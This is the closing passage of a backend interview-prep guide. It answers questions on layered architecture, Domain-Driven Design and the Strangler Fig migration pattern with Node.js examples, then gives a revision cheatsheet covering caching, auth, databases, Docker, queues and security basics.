│  Handles: business rules, validation, orchestration      │
├─────────────────────────────────────────────────────────┤
│  Data Access Layer  (repositories, DAOs)                 │
│  Handles: DB queries, ORM, data mapping                  │
├─────────────────────────────────────────────────────────┤
│  Infrastructure Layer  (DB, Redis, external APIs)        │
│  Handles: actual DB connections, third-party calls       │
└─────────────────────────────────────────────────────────┘
```

**Code example:**

```
project/
├── routes/        ← Presentation layer
│   └── users.js
├── controllers/   ← Presentation layer (request/response handling)
│   └── userController.js
├── services/      ← Business logic layer
│   └── userService.js
├── repositories/  ← Data access layer
│   └── userRepository.js
└── models/        ← Data models / DB schema
    └── User.js
```

```js
// ── routes/users.js (Presentation) ──────────────────────────────────
router.post('/users',
  validate(createUserSchema),
  userController.create
);

// ── controllers/userController.js (Presentation) ──────────────────
const create = async (req, res, next) => {
  try {
    const user = await userService.createUser(req.body);  // calls service
    res.status(201).json({ data: user });
  } catch (err) {
    next(err);
  }
};

// ── services/userService.js (Business Logic) ─────────────────────
async function createUser({ name, email, password }) {
  // Business rule: email must be unique
  const existing = await userRepository.findByEmail(email);
  if (existing) throw new ConflictError('Email already registered');

  // Business rule: hash password
  const passwordHash = await bcrypt.hash(password, 12);

  // Orchestrate: create user + send welcome email
  const user = await userRepository.create({ name, email, passwordHash });
  await emailService.sendWelcome(user);  // calls another service

  return user;
}

// ── repositories/userRepository.js (Data Access) ─────────────────
async function create(userData) {
  const result = await db.query(
    'INSERT INTO users (name, email, password_hash) VALUES ($1, $2, $3) RETURNING *',
    [userData.name, userData.email, userData.passwordHash]
  );
  return result.rows[0];
}

async function findByEmail(email) {
  const result = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  return result.rows[0] || null;
}
```

**Benefits:**
- Separation of concerns — easy to test each layer in isolation.
- Business logic is independent of HTTP framework or DB technology.
- Can swap DB (Postgres → MongoDB) by only changing the repository layer.

> 📖 Reference: [Layered Architecture — O'Reilly](https://www.oreilly.com/library/view/software-architecture-patterns/9781491971437/ch01.html)

---

**Q59. What is Domain-Driven Design (DDD)? What is a bounded context?**

**Answer:**

**Domain-Driven Design (DDD)** is an approach to software design that centers the model around the **business domain** — focusing on understanding and modeling the real-world problem space.

**Core concepts:**

```
Domain: The problem space (e-commerce, banking, healthcare)
Model:  Software representation of domain concepts

Key building blocks:
- Entity:        Object with identity that persists over time (User, Order)
- Value Object:  Immutable object defined by its attributes (Money, Address)
- Aggregate:     Cluster of entities/VOs treated as a single unit (Order + OrderItems)
- Repository:    Abstracts persistence for aggregates
- Domain Service: Business logic not belonging to a single entity
- Domain Event:  Something significant that happened in the domain
```

**Bounded Context — the most important concept:**

```
A Bounded Context defines the boundary within which a domain model is valid and consistent.
The same word can mean different things in different bounded contexts.

E-commerce example:

┌────────────────────────┐  ┌──────────────────────────┐  ┌─────────────────────────┐
│   Order Context        │  │  Inventory Context        │  │  Shipping Context        │
│                        │  │                           │  │                          │
│  "Product" =           │  │  "Product" =              │  │  "Product" =             │
│  name, price, image    │  │  SKU, warehouse loc, qty  │  │  weight, dimensions      │
│                        │  │                           │  │                          │
│  "Customer" =          │  │  (no customer concept)    │  │  "Customer" =            │
│  profile, order history│  │                           │  │  shipping address only   │
└────────────────────────┘  └──────────────────────────┘  └─────────────────────────┘
```

**Code example:**

```js
// Order Context (Order Aggregate)
class Order {
  constructor(id, customerId) {
    this.id = id;
    this.customerId = customerId;
    this.items = [];
    this.status = 'draft';
    this.domainEvents = [];
  }

  addItem(productId, productName, price, quantity) {
    // Business rule: can only add items to draft orders
    if (this.status !== 'draft') {
      throw new Error('Cannot add items to a non-draft order');
    }
    this.items.push(new OrderItem(productId, productName, price, quantity));
  }

  place() {
    // Business rule: must have at least one item
    if (this.items.length === 0) throw new Error('Order must have items');

    this.status = 'placed';
    this.placedAt = new Date();

    // Raise domain event — other contexts listen to this
    this.domainEvents.push(new OrderPlaced({
      orderId:    this.id,
      customerId: this.customerId,
      total:      this.calculateTotal(),
      items:      this.items
    }));
  }

  calculateTotal() {
    return this.items.reduce((sum, item) => sum + item.subtotal, 0);
  }
}

// Value Object — immutable, no identity
class Money {
  constructor(amount, currency) {
    if (amount < 0) throw new Error('Amount cannot be negative');
    this.amount   = amount;
    this.currency = currency;
    Object.freeze(this); // immutable
  }

  add(other) {
    if (this.currency !== other.currency) throw new Error('Currency mismatch');
    return new Money(this.amount + other.amount, this.currency);
  }
}
```

> 📖 Reference: [DDD — Martin Fowler](https://martinfowler.com/bliki/DomainDrivenDesign.html)

---

**Q60. What is the Strangler Fig pattern? How is it used to migrate a monolith to microservices?**

**Answer:**

The **Strangler Fig** pattern (named after a fig tree that grows around a host tree and eventually replaces it) incrementally replaces a legacy system by routing traffic to new services one feature at a time — until the old system can be safely retired.

```
Phase 1: Monolith handles everything
  Client → [Monolith: users, orders, products, payments, notifications]

Phase 2: Extract one service, route selectively
  Client → [Router/Proxy] → [User Service]  (new!)
                           → [Monolith]     (users removed, rest stays)

Phase 3: Extract another
  Client → [Router/Proxy] → [User Service]
                           → [Order Service] (new!)
                           → [Monolith]      (users + orders removed)

Phase N: Monolith is empty → retire it
  Client → [Router/Proxy] → [User Service]
                           → [Order Service]
                           → [Product Service]
                           → [Payment Service]
```

**Implementation with a proxy/API gateway:**

```js
// ── Phase 1: Facade (proxy) in front of monolith ──────────────────────
const proxy = require('express-http-proxy');
const express = require('express');
const app = express();

// ✅ New User Service handling /users (strangled from monolith)
app.use('/api/users', proxy('http://user-service.internal:3001'));

// ✅ New Order Service (recently extracted)
app.use('/api/orders', proxy('http://order-service.internal:3002'));

// ❌ Everything else still goes to monolith
app.use('/', proxy('http://monolith.internal:8080'));

// As each service is extracted, update these routes
// When monolith is empty, remove the last catch-all

// ── Database migration strategy ───────────────────────────────────────
// Phase 1: New service writes to BOTH new DB and monolith DB
// Phase 2: Verify data in both DBs match
// Phase 3: New service reads from new DB, writes to both (dual write)
// Phase 4: Remove dual write — new service only uses its own DB

// ── Feature flag for gradual cutover ─────────────────────────────────
app.use('/api/users', async (req, res, next) => {
  const useNewService = await featureFlag.isEnabled('use-user-service', req.user?.id);

  if (useNewService) {
    return proxy('http://user-service.internal:3001')(req, res, next);
  } else {
    return proxy('http://monolith.internal:8080')(req, res, next); // legacy
  }
});
// Roll out to 5% → 25% → 50% → 100% of users
// Roll back instantly if issues found
```

**Why it's better than "big bang rewrite":**
- System stays live throughout migration.
- Problems found early (5% of users, not all).
- Business gets new service value incrementally.
- Risk is limited to one service at a time.
- Can pause or revert at any point.

> 📖 Reference: [Strangler Fig Pattern — Martin Fowler](https://martinfowler.com/bliki/StranglerFigApplication.html)

---

## 🎯 Quick Revision Cheatsheet

| # | Topic | Key Point |
|---|-------|-----------|
| Q1 | Caching | Solves speed + DB load; memory (~0.1ms) vs DB (~50ms) |
| Q2 | Cache types | In-memory=process-local; Redis=distributed; CDN=edge |
| Q3 | Cache-Aside | App checks cache → miss → query DB → store. Manual invalidation |
| Q4 | Write-Through vs Write-Behind | Write-Through=sync DB+cache; Write-Behind=write cache, async DB |
| Q5 | Eviction policies | LRU=least recently used; LFU=least frequently; FIFO=oldest first |
| Q6 | Cache stampede | Mass cache miss → DB overload; fix with mutex lock or early refresh |
| Q7 | Cache invalidation | Hardest problem; strategies: TTL, event-based, cache tags |
| Q8 | Redis beyond cache | Sessions, rate limiting, pub/sub, leaderboards (sorted sets), locks |
| Q9 | TTL | Set based on: change frequency × staleness tolerance × query cost |
| Q10 | JWT storage | localStorage=XSS risk; HttpOnly cookie=CSRF risk; cookie+SameSite=best |
| Q11 | Silent refresh | Short access token (15m) + long refresh token (30d) + axios interceptor |
| Q12 | JWT revocation | Hard because stateless; workaround: blocklist in Redis or version number |
| Q13 | OAuth Auth Code Flow | Browser redirects → auth server → code → backend exchanges for token |
| Q14 | PKCE | Prevents code interception; verifier sent at token exchange, not before |
| Q15 | OAuth vs OIDC | OAuth=authorization (can you access X?); OIDC=authentication (who are you?) |
| Q16 | RBAC | Roles have permissions; users have roles; check permission in middleware |
| Q17 | Composite index | Multi-column index; left-prefix rule; equality columns first |
| Q18 | Covering index | All needed columns in index → no heap lookup → Index Only Scan |
| Q19 | Full-text search | tsvector + GIN index; ranked results; handles stemming unlike LIKE |
| Q20 | DB query cache | MySQL removed it; use application-level Redis cache instead |
| Q21 | DB deadlock | Circular lock wait; prevent with consistent lock ordering + retry |
| Q22 | Clustered index | IS the table (primary key); 1 per table; rows physically ordered |
| Q23 | Slow query detection | pg_stat_statements + EXPLAIN ANALYZE + slow query log |
| Q24 | Partitioning | Horizontal=split rows by key; Vertical=split columns by access pattern |
| Q25 | Containers vs VMs | Containers share kernel; faster, lighter; VMs fully isolated |
| Q26 | Dockerfile | FROM, RUN, COPY, CMD, EXPOSE, ENV; copy package.json before source for cache |
| Q27 | Image vs Container | Image=blueprint (immutable); Container=running instance; Registry=storage |
| Q28 | Docker Compose | Multi-container dev env; single docker-compose.yml; one command to start all |
| Q29 | Multi-stage build | Build in heavy image; copy artifacts to slim final image; 1.2GB → 180MB |
| Q30 | Volumes vs Bind Mounts | Volume=Docker-managed (data); Bind=host path (dev hot-reload) |
| Q31 | Docker networking | Containers on same network talk by name; compose creates default network |
| Q32 | Background jobs | Async tasks outside request cycle; email, image resize, invoice generation |
| Q33 | Message vs Task Queue | Message queue=transport; Task queue=job execution with retry/scheduling |
| Q34 | Delivery guarantees | At-most-once=may lose; At-least-once=may duplicate; Exactly-once=hard |
| Q35 | DLQ | Failed messages after max retries; prevents loss; inspect + replay |
| Q36 | Job idempotency | Safe to run N times; use deduplication key, upsert, status check |
| Q37 | Cron vs Event-driven | Cron=time-based (billing); Event=immediate reaction (signup email) |
| Q38 | GraphQL | Client specifies exact fields; solves over-fetching and under-fetching |
| Q39 | gRPC | Binary Protobuf over HTTP/2; 5-10x faster than REST; for internal services |
| Q40 | BFF | Dedicated backend per frontend type; mobile gets lean API, web gets rich API |
| Q43 | NoSQL types | Document, Key-Value, Column-Family, Graph; each for different data patterns |
| Q46 | Eventual consistency | Replicas sync eventually; low latency; staleness acceptable for many use cases |
| Q47 | CAP theorem | CP=consistent during partition; AP=available during partition; choose wisely |
| Q48 | OWASP Top 10 | Broken Access Control, Injection, Crypto Failures, SSRF among top 5 |
| Q49 | Security headers | CSP (XSS), HSTS (HTTPS), X-Frame-Options (clickjacking), X-Content-Type |
| Q50 | Least privilege | Minimal permissions; DB user can't DROP; IAM role scoped to one bucket |
| Q53 | Latency vs Throughput | Latency=single request time; Throughput=requests per second |
| Q54 | Load balancer | Round-Robin=sequential; Least-Connections=route to least busy |
| Q56 | Read replica | Read-heavy queries → replica; writes → primary; watch for replication lag |
| Q58 | Layered Architecture | Routes → Controllers → Services → Repositories → DB |
| Q59 | DDD | Domain model + bounded contexts; same term means different things per context |
| Q60 | Strangler Fig | Migrate monolith piece by piece; proxy routes traffic; no big bang rewrite |

---

## 🤝 Contributing

Found a better explanation or a cleaner code example?
- Fork the repo, update the answer, open a PR.
- PR title format: `[Solution-Day-03] Improve answer for Q6`

---

> ⭐ Star this repo if it helped you prepare!
